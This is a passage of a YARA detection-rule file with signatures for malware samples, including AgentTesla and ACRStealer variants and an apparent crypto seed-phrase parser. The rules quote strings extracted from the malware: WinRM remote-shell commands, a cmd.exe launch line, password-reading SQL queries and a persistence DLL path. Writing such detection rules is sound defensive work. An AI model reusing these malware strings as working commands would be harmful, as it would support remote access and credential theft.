      $x12 = "logmessagelog eventa formatting trait implementation returned an error when the underlying stream did notLazy instance has previ" ascii /* score: '32.00'*/
      $x13 = "file browse failed for received sleep interval updatedownload failed: failed to change directory: change directory failed for fi" ascii /* score: '32.00'*/
      $x14 = "__ZN4core3ptr309drop_in_place$LT$std..sync..poison..PoisonError$LT$std..sync..poison..mutex..MutexGuard$LT$hyper_util..client..l" ascii /* score: '31.00'*/
      $x15 = "__ZN4core3ptr590drop_in_place$LT$core..result..Result$LT$std..sync..poison..mutex..MutexGuard$LT$hyper_util..client..legacy..poo" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 17000KB and
      1 of ($x*)
}

rule ACRStealer_signature__7089c0070011547b02d4915723b71c10_imphash_ {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_7089c0070011547b02d4915723b71c10(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d28e1f4b750b0927fe283b4c9d158ef9074bc2a4f45037f5c57aa862255b899f"
   strings:
      $s1 = "Kriekthais.zox" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      all of them
}

rule AgentTesla_signature__73583f26 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_73583f26.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "73583f260a22af83270d89dcaa9b440c85d454b562e2898698179075b77e84c7"
   strings:
      $x1 = "'private const ybnbgqcjhk = \"  -filter:\"\"select * from Win32_process where handle=0\"\"\"" fullword ascii /* score: '32.00'*/
      $s2 = "private const znkcbv = \"  winrm create shell/Aargau -file:shell.xml -remote:srv.corp.com\"" fullword ascii /* score: '29.00'*/
      $s3 = "private const uayhhrriblqc = \"  winrm enum shell/Aargau -remote:srv.corp.com\"" fullword ascii /* score: '29.00'*/
      $s4 = "private const yiwnlcxo = \"  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM\"" fullword ascii /* score: '28.00'*/
      $s5 = "'private const xsnctqonyo = \"  winrm enum wmicimv2/* -filter:\"\"select * from win32_service where StartMode=\\\"\"Auto\\\"\" a" ascii /* score: '27.00'*/
      $s6 = "private const ukkndwllyrdh = \"  winrm e wmicimv2/* -filter:\"\"select * from Win32_Service where State!='Running' and StartMode" ascii /* score: '27.00'*/
      $s7 = "private const kkdejttqmjjh = \"  winrm get uri -r:srv.corp.com\"" fullword ascii /* score: '27.00'*/
      $s8 = "'private const xsnctqonyo = \"  winrm enum wmicimv2/* -filter:\"\"select * from win32_service where StartMode=\\\"\"Auto\\\"\" a" ascii /* score: '27.00'*/
      $s9 = "private const ukkndwllyrdh = \"  winrm e wmicimv2/* -filter:\"\"select * from Win32_Service where State!='Running' and StartMode" ascii /* score: '27.00'*/
      $s10 = "private const plnihsqvkekt = \"  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subj" ascii /* score: '27.00'*/
      $s11 = "Set endoconal = rhyngota.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s12 = "private const zftvjpevvr = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Sub" ascii /* score: '26.00'*/
      $s13 = "private const pxcsrawa = \"Executes method specified by ACTION on target object specified by RESOURCE_URI\"" fullword ascii /* score: '26.00'*/
      $s14 = "private const gqzmgnijzjms = \"Example: identify if WS-Management is running on www.example.com:\"" fullword ascii /* score: '26.00'*/
      $s15 = "private const alipfpk = \"  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subjec" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x0d27 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule sig_8a530b7aadb676e027d3f2ea25db2010762e6c39a83efe7a2a44124b6d1c02d3_8a530b7a {
   meta:
      description = "_subset_batch - file 8a530b7aadb676e027d3f2ea25db2010762e6c39a83efe7a2a44124b6d1c02d3_8a530b7a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8a530b7aadb676e027d3f2ea25db2010762e6c39a83efe7a2a44124b6d1c02d3"
   strings:
      $s1 = "PPackageTypeInfoPK@" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c4133609 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c4133609.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c4133609748071a200e855b6681ce59b918d73fea3a3aa67c7053af38cfda2f2"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD#sY" fullword ascii /* score: '27.00'*/
      $s2 = "BTpN.exe" fullword wide /* score: '22.00'*/
      $s3 = "GetSystemPrinters" fullword ascii /* score: '19.00'*/
      $s4 = "<GetSystemPrinters>b__12_0" fullword ascii /* score: '19.00'*/
      $s5 = "BTpN.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "Contract_Template.pdf" fullword wide /* score: '14.00'*/
      $s7 = "GetCompletedJobsCount" fullword ascii /* score: '12.00'*/
      $s8 = "<GetCompletedJobsCount>b__19_0" fullword ascii /* score: '12.00'*/
      $s9 = "Meeting_Notes.txt" fullword wide /* score: '11.00'*/
      $s10 = "Report_Q3_2023.pdf" fullword wide /* score: '10.00'*/
      $s11 = "john.doe" fullword wide /* score: '10.00'*/
      $s12 = "GetPrintJobsByPrinter" fullword ascii /* score: '9.00'*/
      $s13 = "<GetPrintJobsByPrinter>b__0" fullword ascii /* score: '9.00'*/
      $s14 = "GetPrintJobById" fullword ascii /* score: '9.00'*/
      $s15 = "GetNextJobId" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_845e9239094fb1b16212cbefed852dfc_imphash_ {
   meta:
      description = "_subset_batch - file 845e9239094fb1b16212cbefed852dfc(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0ddcfa247c71e506be25f64ba7f846a91b6bec9a2aac63839f151eeb1a0d5cce"
   strings:
      $x1 = "C:\\Users\\%s\\AppData\\Local\\%s" fullword ascii /* score: '35.50'*/
      $s2 = "schedule.dll" fullword ascii /* score: '23.00'*/
      $s3 = "xUpdate.exe" fullword ascii /* score: '22.00'*/
      $s4 = "schedule.EXE" fullword wide /* score: '22.00'*/
      $s5 = "SELECT * FROM %s WHERE work_type='xeim_dir' AND work_creator LIKE '%%%s%%' AND work_dir='%s' OR work_creator='xeim_system'" fullword ascii /* score: '18.00'*/
      $s6 = "upassword" fullword ascii /* score: '16.00'*/
      $s7 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=%s%s" fullword ascii /* score: '14.00'*/
      $s8 = "SELECT * FROM userinfo WHERE uid='%s'" fullword ascii /* score: '14.00'*/
      $s9 = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source='%s%s'" fullword ascii /* score: '14.00'*/
      $s10 = "SELECT %s FROM %s WHERE work_creator LIKE '%%,%s,%%' AND work_subject LIKE '%%%s%%'" fullword ascii /* score: '13.50'*/
      $s11 = "user.mdb" fullword ascii /* score: '13.00'*/
      $s12 = ";Password=" fullword ascii /* score: '12.00'*/
      $s13 = "SELECT * FROM userinfo" fullword ascii /* score: '11.00'*/
      $s14 = "SELECT * FROM %s WHERE work_index=%s" fullword ascii /* score: '11.00'*/
      $s15 = "SELECT * FROM %s WHERE work_type='xeim_dir' AND work_dir='%s'" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0cad204b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0cad204b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0cad204b7b1977deedab017724f427459c001618f6566015ccde93a52dd8f470"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = "XnlbbUFHSF" fullword ascii /* base64 encoded string '^y[mAGH' */ /* score: '14.00'*/
      $s3 = "hIHKjdjbWDaADwBcVjaxYHgeT" fullword ascii /* score: '9.00'*/
      $s4 = "RzuLvOKxOEYeodYqEy" fullword ascii /* score: '9.00'*/
      $s5 = "JCRkbAxAoAIbIrckZoYt" fullword ascii /* score: '9.00'*/
      $s6 = "WFTjTidhFeYE" fullword ascii /* score: '9.00'*/
      $s7 = "XsaEdCspYtpYbGtkF" fullword ascii /* score: '9.00'*/
      $s8 = "ziMdNLKVwiRCtrRFFvRHMUDm" fullword ascii /* score: '9.00'*/
      $s9 = "IjVOetZQmUYugEtMoKdSmTzw" fullword ascii /* score: '9.00'*/
      $s10 = "VlOGQXROafnW" fullword ascii /* score: '9.00'*/
      $s11 = "VPSAanYjbqLogggJFONTtSV" fullword ascii /* score: '9.00'*/
      $s12 = "aRPCHzqICXXyHqxPXkcPFTp" fullword ascii /* score: '9.00'*/
      $s13 = "zeYEtIvAvwBZlThZjpvOtAY" fullword ascii /* score: '9.00'*/
      $s14 = "RvfGETSGraVydHTlAPbrk" fullword ascii /* score: '9.00'*/
      $s15 = "rxtUeoNJnxMnbEYeTURJ" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a3780d74 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a3780d74.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a3780d745a6bdacc7d83deeaa7072a3ecaf70933e50d916c01eb315f7ce471af"
   strings:
      $s1 = "Client.exe" fullword wide /* score: '22.00'*/
      $s2 = ":http://crt.sectigo.com/SectigoPublicCodeSigningRootR46.p7c0#" fullword ascii /* score: '19.00'*/
      $s3 = ":http://crl.sectigo.com/SectigoPublicCodeSigningRootR46.crl0{" fullword ascii /* score: '19.00'*/
      $s4 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s5 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii /* score: '16.00'*/
      $s6 = ":http://crl.sectigo.com/SectigoPublicCodeSigningCAEVR36.crl0{" fullword ascii /* score: '16.00'*/
      $s7 = ":http://crt.sectigo.com/SectigoPublicCodeSigningCAEVR36.crt0#" fullword ascii /* score: '16.00'*/
      $s8 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii /* score: '15.00'*/
      $s9 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii /* score: '15.00'*/
      $s10 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
      $s11 = "http://ocsp.sectigo.com0$" fullword ascii /* score: '14.00'*/
      $s12 = "EETccT!!!!" fullword wide /* score: '13.00'*/
      $s13 = "gtFsrtEMpQbaRJl" fullword ascii /* score: '11.00'*/
      $s14 = "JbcDnyABpIepipED" fullword ascii /* score: '10.00'*/
      $s15 = "PvdUpBfTPNZISektoGtZ" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_9dd8c0ff4fc84287e5b766563240f983_imphash_ {
   meta:
      description = "_subset_batch - file 9dd8c0ff4fc84287e5b766563240f983(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "26cdaef43d31b3049e6820cc4f3e1f48cb5e5e985d013814140c87bd386b39df"
   strings:
      $s1 = "ClgG.gif" fullword ascii /* score: '10.00'*/
      $s2 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "4&=\\~6#53" fullword ascii /* score: '9.00'*/ /* hex encoded string 'FS' */
      $s4 = "TQCp- J'5e" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      all of them
}

rule sig_82938b680bdaeddb0585cac072868e68412b830dfdc49a45e833f38631855e67_82938b68 {
   meta:
      description = "_subset_batch - file 82938b680bdaeddb0585cac072868e68412b830dfdc49a45e833f38631855e67_82938b68.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "82938b680bdaeddb0585cac072868e68412b830dfdc49a45e833f38631855e67"
   strings:
      $x1 = "%programdata%\\USOShared\\Logs\\User\\svrobj.dll" fullword wide /* score: '35.00'*/
      $x2 = "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $x3 = "C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '32.00'*/
      $s4 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Microsoft " wide /* score: '28.00'*/
      $s5 = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" fullword ascii /* score: '24.00'*/
      $s6 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#Visual" wide /* score: '24.00'*/
      $s7 = "svrobj.dll" fullword wide /* score: '23.00'*/
      $s8 = "        Public Declare Function RCKE Lib \"advapi32.dll\" Alias \"RegCreateKeyExW\" (            ByVal hKey As Long,            " ascii /* score: '22.00'*/
      $s9 = "C:\\Windows\\System32\\stdole2.tlb" fullword ascii /* score: '21.00'*/
      $s10 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s11 = "pi32.dll" fullword ascii /* score: '20.00'*/
      $s12 = "VBE7.DLL" fullword ascii /* score: '20.00'*/
      $s13 = "*\\G{00020813-0000-0000-C000-000000000046}#1.9#0#C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE#Microsoft Excel " wide /* score: '20.00'*/
      $s14 = "advapi32.dll}0" fullword ascii /* score: '19.00'*/
      $s15 = "        Public Declare Function CP Lib \"kernel32\" Alias \"CreateProcessW\" (                                                  " ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_8adedc7188903139678fb42b34d5e278_imphash_ {
   meta:
      description = "_subset_batch - file 8adedc7188903139678fb42b34d5e278(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "13dd5ce20cadb5cb065eb812cf638b8567dd8f899d8a1d8b27b493a62194be93"
   strings:
      $x1 = "[abandonabilityableaboutaboveabsentabsorbabstractabsurdabuseaccessaccidentaccountaccuseachieveacidacousticacquireacrossactaction" ascii /* score: '66.00'*/
      $x2 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '51.00'*/
      $x3 = "cmd.exe/cstart https://t.me/takeoutonesoftpausePath not found!" fullword ascii /* score: '36.00'*/
      $x4 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s5 = "C:\\Users\\coffee\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\indicatif-0.17.8\\src\\draw_target.rs" fullword ascii /* score: '30.00'*/
      $s6 = "PoisonErrorC:\\Users\\coffee\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\console-0.15.8\\src\\ansi.rs" fullword ascii /* score: '30.00'*/
      $s7 = "exe\\\\.\\NUL\\cmd.exemaximum number of ProcThreadAttributes exceeded" fullword ascii /* score: '30.00'*/
      $s8 = "fOutOfMemoryOtherUncategorizedlibrary\\std\\src\\sys\\pal\\windows\\args.rscmd.exe /e:ON /v:OFF /d /c \"batch file arguments are" ascii /* score: '30.00'*/
      $s9 = "assertion failed: self.pos == self.end_of_completeC:\\Users\\coffee\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\li" ascii /* score: '29.00'*/
      $s10 = "assertion failed: self.pos == self.end_of_completeC:\\Users\\coffee\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\li" ascii /* score: '29.00'*/
      $s11 = "Usage: Drag'n'drop folder to .exe or enter path in cmd like seed_parser.exe path/to/parsingfailed read line" fullword ascii /* score: '27.00'*/
      $s12 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s13 = "tpriorityprisonprivateprizeproblemprocessproduceprofitprogramprojectpromoteproofpropertyprosperprotectproudprovidepublicpuddingp" ascii /* score: '25.00'*/
      $s14 = "C:\\Users\\coffee\\.cargo\\registry\\src\\index.crates.io-6f17d22bba15001f\\chrono-0.4.38\\src\\offset\\local\\mod.rs" fullword ascii /* score: '23.00'*/
      $s15 = "idenceevilevokeevolveexactexampleexcessexchangeexciteexcludeexcuseexecuteexerciseexhaustexhibitexileexistexitexoticexpandexpecte" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_9b33cca625866c5c80e72a65931cc56e4613bc782929e6d46c1a11ff41c3726c_9b33cca6 {
   meta:
      description = "_subset_batch - file 9b33cca625866c5c80e72a65931cc56e4613bc782929e6d46c1a11ff41c3726c_9b33cca6.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9b33cca625866c5c80e72a65931cc56e4613bc782929e6d46c1a11ff41c3726c"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "019-04-09T11:10:53+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s7 = "iRCDjJQS" fullword ascii /* score: '9.00'*/
      $s8 = "* )BJT" fullword ascii /* score: '9.00'*/
      $s9 = "Evt:instanceID=\"xmp.iid:e9c6ca89-d3ff-f048-aa96-90687776a152\" stEvt:when=\"2019-04-09T11:10:53+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 800KB and
      all of them
}

rule a64fd7a52bdb0ca6706d48808d24027741a47c5738461cf134db26f4774119ec_a64fd7a5 {
   meta:
      description = "_subset_batch - file a64fd7a52bdb0ca6706d48808d24027741a47c5738461cf134db26f4774119ec_a64fd7a5.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a64fd7a52bdb0ca6706d48808d24027741a47c5738461cf134db26f4774119ec"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "019-04-09T10:50:22+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s7 = "79%.5*|(1" fullword ascii /* score: '9.00'*/ /* hex encoded string 'yQ' */
      $s8 = "Evt:instanceID=\"xmp.iid:23d166af-d496-d54d-8ca1-86a2125735f1\" stEvt:when=\"2019-04-09T10:50:22+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule a76f616061fc008285821d5a40ef4bf5e94600b76689edcf2b9a52fcbf0eea0c_a76f6160 {
   meta:
      description = "_subset_batch - file a76f616061fc008285821d5a40ef4bf5e94600b76689edcf2b9a52fcbf0eea0c_a76f6160.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a76f616061fc008285821d5a40ef4bf5e94600b76689edcf2b9a52fcbf0eea0c"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "li> <rdf:li>xmp.did:0479f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> <" ascii /* score: '13.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:967bdff4-b482-2246-b3c4-3c332d8423ea\" stEvt:when=\"2019-04-09T10:54:10+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:54:10+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule aee696a2ecf3430556e18fe2bfc99fba5b16bb3c794524f60bb79a1bebec83a1_aee696a2 {
   meta:
      description = "_subset_batch - file aee696a2ecf3430556e18fe2bfc99fba5b16bb3c794524f60bb79a1bebec83a1_aee696a2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "aee696a2ecf3430556e18fe2bfc99fba5b16bb3c794524f60bb79a1bebec83a1"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '27.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s4 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:323c47e2-fd44-b04b-b80e-36e06bd8c30b\" stEvt:when=\"2019-04-09T10:50:12+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:12+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule a62be453d1c56ee06ffec886288a1a6ce5bf1af7be8554c883af6c1b634764d0_a62be453 {
   meta:
      description = "_subset_batch - file a62be453d1c56ee06ffec886288a1a6ce5bf1af7be8554c883af6c1b634764d0_a62be453.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a62be453d1c56ee06ffec886288a1a6ce5bf1af7be8554c883af6c1b634764d0"
   strings:
      $s1 = "%lu %d%c" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 40KB and
      all of them
}

rule a9c887a4f18a3fede2cc29ceea138ed3_imphash_ {
   meta:
      description = "_subset_batch - file a9c887a4f18a3fede2cc29ceea138ed3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "eb571d401c88c3332a9cc21695e623f9919df47b18a1896398061f3b52700b0d"
   strings:
      $s1 = "                <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s2 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule a9c887a4f18a3fede2cc29ceea138ed3_imphash__5de978f6 {
   meta:
      description = "_subset_batch - file a9c887a4f18a3fede2cc29ceea138ed3(imphash)_5de978f6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5de978f6590f0bba5683ae43ddc98350425741d9d94416315848e0ecbfb9f89f"
   strings:
      $s1 = "                <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s2 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule sig_817211e0d6fc9e4124f92c582a6c148639e847b5d1c8f7f92a9bc8c541f0f6a2_817211e0 {
   meta:
      description = "_subset_batch - file 817211e0d6fc9e4124f92c582a6c148639e847b5d1c8f7f92a9bc8c541f0f6a2_817211e0.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "817211e0d6fc9e4124f92c582a6c148639e847b5d1c8f7f92a9bc8c541f0f6a2"
   strings:
      $s1 = "F8b2bXTkc1dpJE3GiiNjn/pW7EKRmQ500SgFP/5pCt/xZa5dcJEv76X9b7zCWh+8P9y9ZZOmNR2XXAUq/egnbgacufTPk/iQSy9HJwQAUOg2qfP5Lyj84EGnyDxT8VZz" ascii /* score: '16.00'*/
      $s2 = "qG2Dj5F4pjndKdKstFw4y+Ue4PilHr8dG+6dUuoJhkhft4YSb79Bgcv/DlfITkIXZH5mx1e/+LyxZ9eYEubDu3JcvJ4Kjy2R9TlZwr5Nw4m+J8hrzHqi22KirAJK3Uvz" ascii /* score: '16.00'*/
      $s3 = "yDXmydxk7jQZeUKl8wwlHhUvo0Tbj7XWiiekk5sYmhmZSpyXrqC5TW3pZ9Ve72oT9VSvHveZ96Vz3P69FH9pLgbwdtwUnOfvK+Nzn//rxKK3PkSapg7QqTJ++FCX+O1f" ascii /* score: '16.00'*/
      $s4 = "TUC0+17Rz7cStSSIgmphE7tbiRCm92K+Z4xk1Lg1P/0xM8SzDgAgdD/z+Svzmb5lUy0iw/mJ6F3vyc5SbbuVKLTZcn5TbXB+q8myrCore89DDYWpfeUy2g4HOQCE7m/E" ascii /* score: '16.00'*/
      $s5 = "xJuvMRaJOEaktS6DWaYPmVxFbSUK6f2DxTh5bFjK5sw1zpdTnKVdf2SQl9OIEuMEiY8VJD5SEHoktZ5cJ8fM6gi5Wp160M5lPF6x6ZPgVFllVN3kHn95HjP27CbW0pKv" ascii /* score: '11.00'*/
